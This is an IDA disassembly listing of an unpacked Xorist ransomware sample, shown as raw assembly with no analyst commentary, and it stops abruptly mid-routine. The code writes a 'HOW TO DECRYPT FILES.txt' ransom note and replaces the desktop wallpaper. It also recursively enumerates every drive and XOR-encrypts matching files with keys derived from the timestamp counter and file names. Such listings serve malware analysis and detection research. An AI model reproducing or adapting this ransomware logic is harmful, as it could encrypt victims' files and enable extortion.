.text:00401000 ;
.text:00401000 ; +-------------------------------------------------------------------------+
.text:00401000 ; |      This file was generated by The Interactive Disassembler (IDA)      |
.text:00401000 ; |           Copyright (c) 2026 Hex-Rays, <support@hex-rays.com>           |
.text:00401000 ; |            <error retrieving user info: Invalid input data>             |
.text:00401000 ; +-------------------------------------------------------------------------+
.text:00401000 ;
.text:00401000 ; Input SHA256 : E034E30CE286D730EB6338EF5626A8E15BA7D6B9A7F1158B2D2883005BAE1287
.text:00401000 ; Input MD5    : 805242256E678B3B8A05AEE3A997D0F1
.text:00401000 ; Input CRC32  : 5E265F94
.text:00401000 ; Compiler     : Visual C++ (guessed)
.text:00401000
.text:00401000 ; File Name   : /home/petik/Downloads/petikvx-archiver/Articles/Trojan-Ransom.Win32.Xorist.ln/Trojan-Ransom.Win32.Xorist.ln-05d0be6bbf2ce6d8b29a257629e071836290cf2a83e16641cf08ba5378317f9a-unpacked.exe
.text:00401000 ; Format      : Portable executable for 80386 (PE)
.text:00401000 ; Imagebase   : 400000
.text:00401000 ; Timestamp   : 4F25949F (Sun Jan 29 18:49:03 2012 UTC)
.text:00401000 ; Section 1. (virtual address 00001000)
.text:00401000 ; Virtual size                  : 00001688 (   5768.)
.text:00401000 ; Section size in file          : 00001800 (   6144.)
.text:00401000 ; Offset to raw data for section: 00000400
.text:00401000 ; Flags 60000020: Text Executable Readable
.text:00401000 ; Alignment     : default
.text:00401000
.text:00401000                 .686p
.text:00401000                 .mmx
.text:00401000                 .model flat
.text:00401000
.text:00401000 ; ===========================================================================
.text:00401000
.text:00401000 ; Segment type: Pure code
.text:00401000 ; Segment permissions: Read/Execute
.text:00401000 _text           segment para public 'CODE' use32
.text:00401000                 assume cs:_text
.text:00401000                 ;org 401000h
.text:00401000                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.text:00401000
.text:00401000 ; =============== S U B R O U T I N E =======================================
.text:00401000
.text:00401000
.text:00401000 ; HRSRC sub_401000()
.text:00401000 sub_401000      proc near               ; CODE XREF: start+15A↓p
.text:00401000                 push    1               ; fCreate
.text:00401002                 push    10h             ; csidl
.text:00401004                 push    offset pszPath  ; pszPath
.text:00401009                 push    0               ; hwnd
.text:0040100B                 call    SHGetSpecialFolderPathA
.text:00401010                 push    offset pszPath  ; lpString2
.text:00401015                 call    sub_40103A
.text:0040101A                 mov     al, byte_40752B
.text:0040101F                 cmp     al, 1
.text:00401021                 jnz     short loc_401034
.text:00401023                 push    10h             ; uType
.text:00401025                 push    0               ; lpCaption
.text:00401027                 push    lpText          ; lpText
.text:0040102D                 push    0               ; hWnd
.text:0040102F                 call    MessageBoxA
.text:00401034
.text:00401034 loc_401034:                             ; CODE XREF: sub_401000+21↑j
.text:00401034                 call    sub_4010FC
.text:00401039                 retn
.text:00401039 sub_401000      endp
.text:00401039
.text:0040103A
.text:0040103A ; =============== S U B R O U T I N E =======================================
.text:0040103A
.text:0040103A ; Attributes: bp-based frame
.text:0040103A
.text:0040103A ; DWORD __stdcall sub_40103A(LPCSTR lpString2)
.text:0040103A sub_40103A      proc near               ; CODE XREF: sub_401000+15↑p
.text:0040103A                                         ; sub_4013A8+139↓p
.text:0040103A
.text:0040103A lpString2       = dword ptr  8
.text:0040103A
.text:0040103A                 push    ebp
.text:0040103B                 mov     ebp, esp
.text:0040103D                 push    [ebp+lpString2] ; lpString2
.text:00401040                 push    offset FileName ; lpString1
.text:00401045                 call    lstrcpyA
.text:0040104A                 push    offset FileName ; pszPath
.text:0040104F                 call    PathAddBackslashA
.text:00401054                 movzx   eax, byte_40752D
.text:0040105B                 cmp     eax, 1
.text:0040105E                 jnz     short loc_401071
.text:00401060                 push    offset String2  ; lpString2
.text:00401065                 push    offset FileName ; lpString1
.text:0040106A                 call    lstrcatA
.text:0040106F                 jmp     short loc_401080
.text:00401071 ; ---------------------------------------------------------------------------
.text:00401071
.text:00401071 loc_401071:                             ; CODE XREF: sub_40103A+24↑j
.text:00401071                 push    offset aHowToDecryptFi ; "HOW TO DECRYPT FILES.txt"
.text:00401076                 push    offset FileName ; lpString1
.text:0040107B                 call    lstrcatA
.text:00401080
.text:00401080 loc_401080:                             ; CODE XREF: sub_40103A+35↑j
.text:00401080                 push    offset FileName ; lpFileName
.text:00401085                 call    GetFileAttributesA
.text:0040108A                 cmp     eax, 0FFFFFFFFh
.text:0040108D                 jz      short loc_401091
.text:0040108F                 jmp     short locret_4010F8
.text:00401091 ; ---------------------------------------------------------------------------
.text:00401091
.text:00401091 loc_401091:                             ; CODE XREF: sub_40103A+53↑j
.text:00401091                 push    0               ; hTemplateFile
.text:00401093                 push    0               ; dwFlagsAndAttributes
.text:00401095                 push    2               ; dwCreationDisposition
.text:00401097                 push    0               ; lpSecurityAttributes
.text:00401099                 push    2               ; dwShareMode
.text:0040109B                 push    40000000h       ; dwDesiredAccess
.text:004010A0                 push    offset FileName ; lpFileName
.text:004010A5                 call    CreateFileA
.text:004010AA                 mov     hFile, eax
.text:004010AF                 push    lpText          ; lpString
.text:004010B5                 call    lstrlenA
.text:004010BA                 push    0               ; lpOverlapped
.text:004010BC                 push    offset NumberOfBytesWritten ; lpNumberOfBytesWritten
.text:004010C1                 push    eax             ; nNumberOfBytesToWrite
.text:004010C2                 push    lpText          ; lpBuffer
.text:004010C8                 push    hFile           ; hFile
.text:004010CE                 call    WriteFile
.text:004010D3                 push    offset LastWriteTime ; lpLastWriteTime
.text:004010D8                 push    offset LastAccessTime ; lpLastAccessTime
.text:004010DD                 push    offset CreationTime ; lpCreationTime
.text:004010E2                 push    hFile           ; hFile
.text:004010E8                 call    SetFileTime
.text:004010ED                 push    hFile           ; hObject
.text:004010F3                 call    CloseHandle
.text:004010F8
.text:004010F8 locret_4010F8:                          ; CODE XREF: sub_40103A+55↑j
.text:004010F8                 leave
.text:004010F9                 retn    4
.text:004010F9 sub_40103A      endp
.text:004010F9
.text:004010FC
.text:004010FC ; =============== S U B R O U T I N E =======================================
.text:004010FC
.text:004010FC ; Attributes: bp-based frame
.text:004010FC
.text:004010FC ; HRSRC sub_4010FC()
.text:004010FC sub_4010FC      proc near               ; CODE XREF: sub_401000:loc_401034↑p
.text:004010FC
.text:004010FC NumberOfBytesWritten= dword ptr -18h
.text:004010FC hFile           = dword ptr -14h
.text:004010FC hResInfo        = dword ptr -10h
.text:004010FC nNumberOfBytesToWrite= dword ptr -0Ch
.text:004010FC hResData        = dword ptr -8
.text:004010FC var_4           = dword ptr -4
.text:004010FC
.text:004010FC                 push    ebp
.text:004010FD                 mov     ebp, esp
.text:004010FF                 add     esp, 0FFFFFFE8h
.text:00401102                 mov     ecx, 10h
.text:00401107                 mov     edi, offset String1
.text:0040110C
.text:0040110C loc_40110C:                             ; CODE XREF: sub_4010FC+22↓j
.text:0040110C                 push    ecx
.text:0040110D                 push    edi
.text:0040110E                 rdtsc
.text:00401110                 pop     edi
.text:00401111                 pop     ecx
.text:00401112                 and     eax, 0F0h
.text:00401117                 shr     eax, 4
.text:0040111A                 add     eax, 61h ; 'a'
.text:0040111D                 stosb
.text:0040111E                 loop    loc_40110C
.text:00401120                 xor     eax, eax
.text:00401122                 stosb
.text:00401123                 push    offset aBmp     ; ".bmp"
.text:00401128                 push    offset String1  ; lpString1
.text:0040112D                 call    lstrcatA
.text:00401132                 push    offset pvParam  ; lpBuffer
.text:00401137                 push    200h            ; nBufferLength
.text:0040113C                 call    GetTempPathA
.text:00401141                 push    offset String1  ; lpString2
.text:00401146                 push    offset pvParam  ; lpString1
.text:0040114B                 call    lstrcatA
.text:00401150                 push    2               ; lpType
.text:00401152                 push    offset Name     ; "pussylicker"
.text:00401157                 push    0               ; hModule
.text:00401159                 call    FindResourceA
.text:0040115E                 or      eax, eax
.text:00401160                 jnz     short loc_401164
.text:00401162                 leave
.text:00401163                 retn
.text:00401164 ; ---------------------------------------------------------------------------
.text:00401164
.text:00401164 loc_401164:                             ; CODE XREF: sub_4010FC+64↑j
.text:00401164                 mov     [ebp+hResInfo], eax
.text:00401167                 push    eax             ; hResInfo
.text:00401168                 push    0               ; hModule
.text:0040116A                 call    SizeofResource
.text:0040116F                 or      eax, eax
.text:00401171                 jnz     short loc_401175
.text:00401173                 leave
.text:00401174                 retn
.text:00401175 ; ---------------------------------------------------------------------------
.text:00401175
.text:00401175 loc_401175:                             ; CODE XREF: sub_4010FC+75↑j
.text:00401175                 mov     [ebp+nNumberOfBytesToWrite], eax
.text:00401178                 push    [ebp+hResInfo]  ; hResInfo
.text:0040117B                 push    0               ; hModule
.text:0040117D                 call    LoadResource
.text:00401182                 or      eax, eax
.text:00401184                 jnz     short loc_401188
.text:00401186                 leave
.text:00401187                 retn
.text:00401188 ; ---------------------------------------------------------------------------
.text:00401188
.text:00401188 loc_401188:                             ; CODE XREF: sub_4010FC+88↑j
.text:00401188                 mov     [ebp+hResData], eax
.text:0040118B                 push    eax             ; hResData
.text:0040118C                 call    LockResource
.text:00401191                 or      eax, eax
.text:00401193                 jnz     short loc_401197
.text:00401195                 leave
.text:00401196                 retn
.text:00401197 ; ---------------------------------------------------------------------------
.text:00401197
.text:00401197 loc_401197:                             ; CODE XREF: sub_4010FC+97↑j
.text:00401197                 mov     [ebp+var_4], eax
.text:0040119A                 mov     ebx, eax
.text:0040119C                 push    0               ; hTemplateFile
.text:0040119E                 push    0               ; dwFlagsAndAttributes
.text:004011A0                 push    2               ; dwCreationDisposition
.text:004011A2                 push    0               ; lpSecurityAttributes
.text:004011A4                 push    3               ; dwShareMode
.text:004011A6                 push    0C0000000h      ; dwDesiredAccess
.text:004011AB                 push    offset pvParam  ; lpFileName
.text:004011B0                 call    CreateFileA
.text:004011B5                 cmp     eax, 0FFFFFFFFh
.text:004011B8                 jz      short loc_40120C
.text:004011BA                 mov     [ebp+hFile], eax
.text:004011BD                 push    0               ; dwMoveMethod
.text:004011BF                 push    0               ; lpDistanceToMoveHigh
.text:004011C1                 push    0               ; lDistanceToMove
.text:004011C3                 push    [ebp+hFile]     ; hFile
.text:004011C6                 call    SetFilePointer
.text:004011CB                 push    0               ; lpOverlapped
.text:004011CD                 lea     eax, [ebp+NumberOfBytesWritten]
.text:004011D0                 push    eax             ; lpNumberOfBytesWritten
.text:004011D1                 push    [ebp+nNumberOfBytesToWrite] ; nNumberOfBytesToWrite
.text:004011D4                 push    ebx             ; lpBuffer
.text:004011D5                 push    [ebp+hFile]     ; hFile
.text:004011D8                 call    WriteFile
.text:004011DD                 push    offset LastWriteTime ; lpLastWriteTime
.text:004011E2                 push    offset LastAccessTime ; lpLastAccessTime
.text:004011E7                 push    offset CreationTime ; lpCreationTime
.text:004011EC                 push    [ebp+hFile]     ; hFile
.text:004011EF                 call    SetFileTime
.text:004011F4                 push    [ebp+hFile]     ; hObject
.text:004011F7                 call    CloseHandle
.text:004011FC                 push    3               ; fWinIni
.text:004011FE                 push    offset pvParam  ; pvParam
.text:00401203                 push    0               ; uiParam
.text:00401205                 push    14h             ; uiAction
.text:00401207                 call    SystemParametersInfoA
.text:0040120C
.text:0040120C loc_40120C:                             ; CODE XREF: sub_4010FC+BC↑j
.text:0040120C                 push    [ebp+hResData]  ; hResData
.text:0040120F                 call    FreeResource
.text:00401214                 leave
.text:00401215                 retn
.text:00401215 sub_4010FC      endp
.text:00401215
.text:00401216
.text:00401216 ; =============== S U B R O U T I N E =======================================
.text:00401216
.text:00401216
.text:00401216 ; int sub_401216()
.text:00401216 sub_401216      proc near               ; CODE XREF: sub_401AB9+143↓p
.text:00401216                 cmp     byte_40752D, 1
.text:0040121D                 jnz     short loc_401234
.text:0040121F                 push    40h ; '@'       ; uType
.text:00401221                 push    offset Caption  ; lpCaption
.text:00401226                 push    offset Text     ; lpText
.text:0040122B                 push    0               ; hWnd
.text:0040122D                 call    MessageBoxA
.text:00401232                 jmp     short loc_401247
.text:00401234 ; ---------------------------------------------------------------------------
.text:00401234
.text:00401234 loc_401234:                             ; CODE XREF: sub_401216+7↑j
.text:00401234                 push    40h ; '@'       ; uType
.text:00401236                 push    offset WindowName ; "Attention!"
.text:0040123B                 push    offset aEnteredPasswor ; "Entered password is correct. Press OK t"...
.text:00401240                 push    0               ; hWnd
.text:00401242                 call    MessageBoxA
.text:00401247
.text:00401247 loc_401247:                             ; CODE XREF: sub_401216+1C↑j
.text:00401247                 xor     eax, eax
.text:00401249                 call    sub_40124F
.text:0040124E                 retn
.text:0040124E sub_401216      endp
.text:0040124E
.text:0040124F
.text:0040124F ; =============== S U B R O U T I N E =======================================
.text:0040124F
.text:0040124F ; Attributes: bp-based frame
.text:0040124F
.text:0040124F ; int __usercall sub_40124F@<eax>(int@<eax>)
.text:0040124F sub_40124F      proc near               ; CODE XREF: sub_401216+33↑p
.text:0040124F                                         ; sub_401AB9+87↓p
.text:0040124F
.text:0040124F var_4           = dword ptr -4
.text:0040124F
.text:0040124F                 push    ebp
.text:00401250                 mov     ebp, esp
.text:00401252                 add     esp, 0FFFFFFFCh
.text:00401255                 push    ebx
.text:00401256                 mov     [ebp+var_4], eax
.text:00401259                 cmp     eax, 0FFFFFFFFh
.text:0040125C                 jnz     short loc_401272
.text:0040125E                 mov     edi, offset dword_406DB9
.text:00401263                 rdtsc
.text:00401265                 stosd
.text:00401266                 stosd
.text:00401267                 stosd
.text:00401268                 stosd
.text:00401269                 mov     edi, offset dword_406595
.text:0040126E                 stosd
.text:0040126F                 stosd
.text:00401270                 stosd
.text:00401271                 stosd
.text:00401272
.text:00401272 loc_401272:                             ; CODE XREF: sub_40124F+D↑j
.text:00401272                 push    offset asc_404041 ; "*"
.text:00401277                 push    offset pszSpec  ; lpString1
.text:0040127C                 call    lstrcpyA
.text:00401281                 push    offset asc_404032 ; "."
.text:00401286                 push    offset pszSpec  ; lpString1
.text:0040128B                 call    lstrcatA
.text:00401290                 push    lpSubKey        ; lpString2
.text:00401296                 push    offset pszSpec  ; lpString1
.text:0040129B                 call    lstrcatA
.text:004012A0                 mov     eax, [ebp+var_4]
.text:004012A3                 cmp     eax, 0FFFFFFFFh
.text:004012A6                 jnz     short loc_4012B1
.text:004012A8                 mov     byte_406550, 2
.text:004012AF                 jmp     short loc_4012B8
.text:004012B1 ; ---------------------------------------------------------------------------
.text:004012B1
.text:004012B1 loc_4012B1:                             ; CODE XREF: sub_40124F+57↑j
.text:004012B1                 mov     byte_406550, 1
.text:004012B8
.text:004012B8 loc_4012B8:                             ; CODE XREF: sub_40124F+60↑j
.text:004012B8                 push    1               ; uMode
.text:004012BA                 call    SetErrorMode
.text:004012BF                 call    GetLogicalDrives
.text:004012C4                 mov     ecx, 19h
.text:004012C9
.text:004012C9 loc_4012C9:                             ; CODE XREF: sub_40124F+B3↓j
.text:004012C9                 mov     ebx, 1
.text:004012CE                 shl     ebx, cl
.text:004012D0                 and     ebx, eax
.text:004012D2                 jz      short loc_401301
.text:004012D4                 add     cl, 41h ; 'A'
.text:004012D7                 mov     byte ptr dword_40444F+1, cl
.text:004012DD                 sub     cl, 41h ; 'A'
.text:004012E0                 mov     dword_40444F+2, 2E2A5C3Ah
.text:004012EA                 mov     byte_404455, 2Ah ; '*'
.text:004012F1                 mov     byte_404456, 0
.text:004012F8                 push    eax
.text:004012F9                 push    ecx
.text:004012FA                 call    sub_4013A8
.text:004012FF                 pop     ecx
.text:00401300                 pop     eax
.text:00401301
.text:00401301 loc_401301:                             ; CODE XREF: sub_40124F+83↑j
.text:00401301                 dec     ecx
.text:00401302                 jge     short loc_4012C9
.text:00401304                 mov     eax, [ebp+var_4]
.text:00401307                 or      eax, eax
.text:00401309                 jnz     short loc_40133E
.text:0040130B                 cmp     byte_40752D, 1
.text:00401312                 jnz     short loc_401329
.text:00401314                 push    40h ; '@'       ; uType
.text:00401316                 push    offset Caption  ; lpCaption
.text:0040131B                 push    offset byte_404077 ; lpText
.text:00401320                 push    0               ; hWnd
.text:00401322                 call    MessageBoxA
.text:00401327                 jmp     short loc_401374
.text:00401329 ; ---------------------------------------------------------------------------
.text:00401329
.text:00401329 loc_401329:                             ; CODE XREF: sub_40124F+C3↑j
.text:00401329                 push    40h ; '@'       ; uType
.text:0040132B                 push    offset WindowName ; "Attention!"
.text:00401330                 push    offset byte_404077 ; lpText
.text:00401335                 push    0               ; hWnd
.text:00401337                 call    MessageBoxA
.text:0040133C                 jmp     short loc_401374
.text:0040133E ; ---------------------------------------------------------------------------
.text:0040133E
.text:0040133E loc_40133E:                             ; CODE XREF: sub_40124F+BA↑j
.text:0040133E                 cmp     eax, 0FFFFFFFFh
.text:00401341                 jnz     short loc_401374
.text:00401343                 cmp     byte_40752D, 1
.text:0040134A                 jnz     short loc_401361
.text:0040134C                 push    40h ; '@'       ; uType
.text:0040134E                 push    offset Caption  ; lpCaption
.text:00401353                 push    offset byte_4041AB ; lpText
.text:00401358                 push    0               ; hWnd
.text:0040135A                 call    MessageBoxA
.text:0040135F                 jmp     short loc_401374
.text:00401361 ; ---------------------------------------------------------------------------
.text:00401361
.text:00401361 loc_401361:                             ; CODE XREF: sub_40124F+FB↑j
.text:00401361                 push    40h ; '@'       ; uType
.text:00401363                 push    offset WindowName ; "Attention!"
.text:00401368                 push    offset aYouHaveReached ; "You have reached a limit of attempts - "...
.text:0040136D                 push    0               ; hWnd
.text:0040136F                 call    MessageBoxA
.text:00401374
.text:00401374 loc_401374:                             ; CODE XREF: sub_40124F+D8↑j
.text:00401374                                         ; sub_40124F+ED↑j ...
.text:00401374                 pop     ebx
.text:00401375                 leave
.text:00401376                 retn
.text:00401376 sub_40124F      endp
.text:00401376
.text:00401377
.text:00401377 ; =============== S U B R O U T I N E =======================================
.text:00401377
.text:00401377 ; Attributes: bp-based frame
.text:00401377
.text:00401377 ; BOOL sub_401377()
.text:00401377 sub_401377      proc near               ; CODE XREF: sub_4013A8:loc_40146D↓p
.text:00401377
.text:00401377 Msg             = tagMSG ptr -1Ch
.text:00401377
.text:00401377                 push    ebp
.text:00401378                 mov     ebp, esp
.text:0040137A                 add     esp, 0FFFFFFE4h
.text:0040137D
.text:0040137D loc_40137D:                             ; CODE XREF: sub_401377+2D↓j
.text:0040137D                 push    1               ; wRemoveMsg
.text:0040137F                 push    0               ; wMsgFilterMax
.text:00401381                 push    0               ; wMsgFilterMin
.text:00401383                 push    0               ; hWnd
.text:00401385                 lea     eax, [ebp+Msg]
.text:00401388                 push    eax             ; lpMsg
.text:00401389                 call    PeekMessageA
.text:0040138E                 test    eax, eax
.text:00401390                 jz      short locret_4013A6
.text:00401392                 lea     eax, [ebp+Msg]
.text:00401395                 push    eax             ; lpMsg
.text:00401396                 call    TranslateMessage
.text:0040139B                 lea     eax, [ebp+Msg]
.text:0040139E                 push    eax             ; lpMsg
.text:0040139F                 call    DispatchMessageA
.text:004013A4                 jmp     short loc_40137D
.text:004013A6 ; ---------------------------------------------------------------------------
.text:004013A6
.text:004013A6 locret_4013A6:                          ; CODE XREF: sub_401377+19↑j
.text:004013A6                 leave
.text:004013A7                 retn
.text:004013A7 sub_401377      endp
.text:004013A7
.text:004013A8
.text:004013A8 ; =============== S U B R O U T I N E =======================================
.text:004013A8
.text:004013A8 ; Attributes: bp-based frame
.text:004013A8
.text:004013A8 ; char *sub_4013A8()
.text:004013A8 sub_4013A8      proc near               ; CODE XREF: sub_40124F+AB↑p
.text:004013A8                                         ; sub_4013A8+A9↓p ...
.text:004013A8
.text:004013A8 FindFileData    = byte ptr -144h
.text:004013A8
.text:004013A8                 push    ebp
.text:004013A9                 mov     ebp, esp
.text:004013AB                 sub     esp, 144h
.text:004013B1                 lea     eax, [ebp+FindFileData]
.text:004013B7                 push    eax             ; lpFindFileData
.text:004013B8                 push    (offset dword_40444F+1) ; lpFileName
.text:004013BD                 call    FindFirstFileA
.text:004013C2                 inc     eax
.text:004013C3                 jz      locret_401746
.text:004013C9                 dec     eax
.text:004013CA                 mov     dword ptr [ebp+FindFileData+13Eh], eax
.text:004013CD
.text:004013CD loc_4013CD:                             ; CODE XREF: sub_4013A8+390↓j
.text:004013CD                 mov     eax, dword ptr [ebp+FindFileData]
.text:004013D3                 and     eax, 10h
.text:004013D6                 jz      loc_40146D
.text:004013DC                 lea     eax, [ebp+FindFileData+2Ch]
.text:004013E2                 push    eax             ; lpString2
.text:004013E3                 push    offset asc_404032 ; "."
.text:004013E8                 call    lstrcmpA
.text:004013ED                 test    eax, eax
.text:004013EF                 jz      loc_401727
.text:004013F5                 lea     eax, [ebp+FindFileData+2Ch]
.text:004013FB                 push    eax             ; lpString2
.text:004013FC                 push    offset asc_404034 ; ".."
.text:00401401                 call    lstrcmpA
.text:00401406                 test    eax, eax
.text:00401408                 jz      loc_401727
.text:0040140E                 push    (offset dword_40444F+1) ; pszPath
.text:00401413                 call    PathFindFileNameA
.text:00401418                 sub     eax, (offset dword_40444F+1)
.text:0040141D                 push    eax
.text:0040141E                 mov     byte ptr (dword_40444F+1)[eax], 0
.text:00401425                 lea     eax, [ebp+FindFileData+2Ch]
.text:0040142B                 push    eax             ; lpString2
.text:0040142C                 push    (offset dword_40444F+1) ; lpString1
.text:00401431                 call    lstrcatA
.text:00401436                 push    (offset dword_40444F+1) ; lpString
.text:0040143B                 call    lstrlenA
.text:00401440                 mov     (dword_40444F+1)[eax], 2A2E2A5Ch
.text:0040144A                 mov     byte_404454[eax], 0
.text:00401451                 call    sub_4013A8
.text:00401456                 pop     eax
.text:00401457                 mov     dword_40444F[eax], 2A2E2A5Ch
.text:00401461                 mov     byte_404453[eax], 0
.text:00401468                 jmp     loc_401727
.text:0040146D ; ---------------------------------------------------------------------------
.text:0040146D
.text:0040146D loc_40146D:                             ; CODE XREF: sub_4013A8+2E↑j
.text:0040146D                 call    sub_401377
.text:00401472                 lea     eax, [ebp+FindFileData+2Ch]
.text:00401478                 push    eax             ; lpString2
.text:00401479                 push    offset String2  ; lpString1
.text:0040147E                 call    lstrcmpiA
.text:00401483                 test    eax, eax
.text:00401485                 jz      loc_401727
.text:0040148B                 lea     eax, [ebp+FindFileData+2Ch]
.text:00401491                 push    eax             ; lpString2
.text:00401492                 push    offset aHowToDecryptFi ; "HOW TO DECRYPT FILES.txt"
.text:00401497                 call    lstrcmpiA
.text:0040149C                 test    eax, eax
.text:0040149E                 jz      loc_401727
.text:004014A4                 lea     eax, [ebp+FindFileData+2Ch]
.text:004014AA                 push    eax             ; lpString2
.text:004014AB                 push    offset String1  ; lpString1
.text:004014B0                 call    lstrcmpiA
.text:004014B5                 test    eax, eax
.text:004014B7                 jz      loc_401727
.text:004014BD                 push    (offset dword_40444F+1) ; pszPath
.text:004014C2                 call    PathFindFileNameA
.text:004014C7                 sub     eax, 404450h
.text:004014CC                 mov     byte ptr [eax+404450h], 0
.text:004014D3                 mov     al, byte_40752A
.text:004014D8                 cmp     al, 1
.text:004014DA                 jnz     short loc_4014E6
.text:004014DC                 push    (offset dword_40444F+1) ; lpString2
.text:004014E1                 call    sub_40103A
.text:004014E6
.text:004014E6 loc_4014E6:                             ; CODE XREF: sub_4013A8+132↑j
.text:004014E6                 lea     ebx, [ebp+FindFileData+2Ch]
.text:004014EC                 push    ebx             ; lpString2
.text:004014ED                 push    (offset dword_40444F+1) ; lpString1
.text:004014F2                 call    lstrcatA
.text:004014F7                 cmp     byte_406550, 1
.text:004014FE                 jnz     short loc_40151B
.text:00401500                 push    offset pszSpec  ; pszSpec
.text:00401505                 push    (offset dword_40444F+1) ; pszFile
.text:0040150A                 call    PathMatchSpecA
.text:0040150F                 cmp     eax, 1
.text:00401512                 jz      short loc_40154B
.text:00401514                 jmp     loc_401727
.text:00401519 ; ---------------------------------------------------------------------------
.text:00401519                 jmp     short loc_40154B
.text:0040151B ; ---------------------------------------------------------------------------
.text:0040151B
.text:0040151B loc_40151B:                             ; CODE XREF: sub_4013A8+156↑j
.text:0040151B                 mov     edi, dword_407519
.text:00401521                 mov     ecx, [edi]
.text:00401523                 add     edi, 4
.text:00401526
.text:00401526 loc_401526:                             ; CODE XREF: sub_4013A8+19C↓j
.text:00401526                 push    ecx
.text:00401527                 push    edi             ; pszSpec
.text:00401528                 push    (offset dword_40444F+1) ; pszFile
.text:0040152D                 call    PathMatchSpecA
.text:00401532                 mov     ebx, eax
.text:00401534                 push    edi             ; lpString
.text:00401535                 call    lstrlenA
.text:0040153A                 add     edi, eax
.text:0040153C                 inc     edi
.text:0040153D                 pop     ecx
.text:0040153E                 cmp     ebx, 1
.text:00401541                 jz      short loc_40154B
.text:00401543                 dec     ecx
.text:00401544                 jnz     short loc_401526
.text:00401546                 jmp     loc_401727
.text:0040154B ; ---------------------------------------------------------------------------
.text:0040154B
.text:0040154B loc_40154B:                             ; CODE XREF: sub_4013A8+16A↑j
.text:0040154B                                         ; sub_4013A8+171↑j ...
.text:0040154B                 push    (offset dword_40444F+1) ; lpString2
.text:00401550                 push    offset ExistingFileName ; lpString1
.text:00401555                 call    lstrcpyA
.text:0040155A                 cmp     byte_406550, 0
.text:00401561                 jnz     short loc_401593
.text:00401563                 push    (offset dword_40444F+1) ; lpString2
.text:00401568                 push    offset NewFileName ; lpString1
.text:0040156D                 call    lstrcpyA
.text:00401572                 push    offset asc_404032 ; "."
.text:00401577                 push    offset NewFileName ; lpString1
.text:0040157C                 call    lstrcatA
.text:00401581                 push    lpSubKey        ; lpString2
.text:00401587                 push    offset NewFileName ; lpString1
.text:0040158C                 call    lstrcatA
.text:00401591                 jmp     short loc_4015C9
.text:00401593 ; ---------------------------------------------------------------------------
.text:00401593
.text:00401593 loc_401593:                             ; CODE XREF: sub_4013A8+1B9↑j
.text:00401593                 cmp     byte_406550, 1
.text:0040159A                 jnz     short loc_4015BA
.text:0040159C                 push    (offset dword_40444F+1) ; lpString2
.text:004015A1                 push    offset NewFileName ; lpString1
.text:004015A6                 call    lstrcpyA
.text:004015AB                 push    offset NewFileName ; pszPath
.text:004015B0                 call    PathFindExtensionA
.text:004015B5                 mov     byte ptr [eax], 0
.text:004015B8                 jmp     short loc_4015C9
.text:004015BA ; ---------------------------------------------------------------------------
.text:004015BA
.text:004015BA loc_4015BA:                             ; CODE XREF: sub_4013A8+1F2↑j
.text:004015BA                 push    (offset dword_40444F+1) ; lpString2
.text:004015BF                 push    offset NewFileName ; lpString1
.text:004015C4                 call    lstrcpyA
.text:004015C9
.text:004015C9 loc_4015C9:                             ; CODE XREF: sub_4013A8+1E9↑j
.text:004015C9                                         ; sub_4013A8+210↑j
.text:004015C9                 push    0               ; hTemplateFile
.text:004015CB                 push    0               ; dwFlagsAndAttributes
.text:004015CD                 push    3               ; dwCreationDisposition
.text:004015CF                 push    0               ; lpSecurityAttributes
.text:004015D1                 push    3               ; dwShareMode
.text:004015D3                 push    0C0000000h      ; dwDesiredAccess
.text:004015D8                 push    offset ExistingFileName ; lpFileName
.text:004015DD                 call    CreateFileA
.text:004015E2                 inc     eax
.text:004015E3                 test    eax, eax
.text:004015E5                 jz      loc_401727
.text:004015EB                 dec     eax
.text:004015EC                 mov     hFile, eax
.text:004015F1                 push    0               ; lpFileSizeHigh
.text:004015F3                 push    hFile           ; hFile
.text:004015F9                 call    GetFileSize
.text:004015FE                 mov     dword_406555, eax
.text:00401603                 cmp     eax, 8
.text:00401606                 jge     short loc_401618
.text:00401608                 push    hFile           ; hObject
.text:0040160E                 call    CloseHandle
.text:00401613                 jmp     loc_401727
.text:00401618 ; ---------------------------------------------------------------------------
.text:00401618
.text:00401618 loc_401618:                             ; CODE XREF: sub_4013A8+25E↑j
.text:00401618                 push    offset stru_40753E ; lpLastWriteTime
.text:0040161D                 push    offset stru_407536 ; lpLastAccessTime
.text:00401622                 push    offset stru_40752E ; lpCreationTime
.text:00401627                 push    hFile           ; hFile
.text:0040162D                 call    GetFileTime
.text:00401632                 push    0               ; dwMoveMethod
.text:00401634                 push    0               ; lpDistanceToMoveHigh
.text:00401636                 push    lDistanceToMove ; lDistanceToMove
.text:0040163C                 push    hFile           ; hFile
.text:00401642                 call    SetFilePointer
.text:00401647                 push    0               ; lpOverlapped
.text:00401649                 push    offset nNumberOfBytesToWrite ; lpNumberOfBytesRead
.text:0040164E                 push    nNumberOfBytesToRead ; nNumberOfBytesToRead
.text:00401654                 push    lpBuffer        ; lpBuffer
.text:0040165A                 push    hFile           ; hFile
.text:00401660                 call    ReadFile
.text:00401665                 cmp     nNumberOfBytesToWrite, 0
.text:0040166C                 jnz     short loc_401673
.text:0040166E                 jmp     loc_4016F3
.text:00401673 ; ---------------------------------------------------------------------------
.text:00401673
.text:00401673 loc_401673:                             ; CODE XREF: sub_4013A8+2C4↑j
.text:00401673                 push    offset ExistingFileName ; pszPath
.text:00401678                 call    PathFindFileNameA
.text:0040167D                 mov     dl, [eax]
.text:0040167F                 mov     ecx, 10h
.text:00401684                 mov     esi, offset dword_406595
.text:00401689                 mov     edi, offset dword_406585
.text:0040168E
.text:0040168E loc_40168E:                             ; CODE XREF: sub_4013A8+2EC↓j
.text:0040168E                 lodsb
.text:0040168F                 xor     al, dl
.text:00401691                 rol     dl, 1
.text:00401693                 stosb
.text:00401694                 loop    loc_40168E
.text:00401696                 mov     eax, nNumberOfBytesToWrite
.text:0040169B                 cmp     byte_40752C, 0
.text:004016A2                 jnz     short loc_4016AB
.text:004016A4                 call    sub_401748
.text:004016A9                 jmp     short loc_4016C0
.text:004016AB ; ---------------------------------------------------------------------------
.text:004016AB
.text:004016AB loc_4016AB:                             ; CODE XREF: sub_4013A8+2FA↑j
.text:004016AB                 cmp     byte_406550, 0
.text:004016B2                 jnz     short loc_4016BB
.text:004016B4                 call    sub_40177A
.text:004016B9                 jmp     short loc_4016C0
.text:004016BB ; ---------------------------------------------------------------------------
.text:004016BB
.text:004016BB loc_4016BB:                             ; CODE XREF: sub_4013A8+30A↑j
.text:004016BB                 call    sub_401797
.text:004016C0
